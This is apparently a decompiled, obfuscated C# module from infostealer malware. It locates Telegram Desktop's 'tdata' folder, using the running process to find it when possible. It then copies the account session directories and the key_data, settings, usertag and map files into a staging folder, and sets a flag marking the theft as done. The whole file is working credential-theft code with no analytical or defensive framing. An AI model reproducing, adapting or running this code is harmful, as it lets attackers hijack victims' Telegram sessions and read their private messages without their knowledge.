using System;
using System.Diagnostics;
using System.IO;
using ns13;
using ns14;
using ns5;

namespace ns6;

internal sealed class Class27
{
	private static string smethod_0()
	{
		string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		if (processesByName.Length == 0)
		{
			return result;
		}
		return Path.Combine(Path.GetDirectoryName(Class22.smethod_1(processesByName[0])), "tdata");
	}

	public static bool smethod_1(string string_0)
	{
		string path = smethod_0();
		try
		{
			if (!Directory.Exists(path))
			{
				return false;
			}
			Directory.CreateDirectory(string_0);
			string[] directories = Directory.GetDirectories(path);
			string[] files = Directory.GetFiles(path);
			string[] array = directories;
			foreach (string text in array)
			{
				string name = new DirectoryInfo(text).Name;
				if (name.Length == 16)
				{
					string string_ = Path.Combine(string_0, name);
					Class62.smethod_1(text, string_);
				}
			}
			array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				string name2 = fileInfo.Name;
				string destFileName = Path.Combine(string_0, name2);
				if (fileInfo.Length <= 5120L)
				{
					if (name2.EndsWith("s") && name2.Length == 17)
					{
						fileInfo.CopyTo(destFileName);
					}
					else if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
					{
						fileInfo.CopyTo(destFileName);
					}
				}
			}
			Class55.bool_0 = true;
			return true;
		}
		catch
		{
			return false;
		}
	}
}
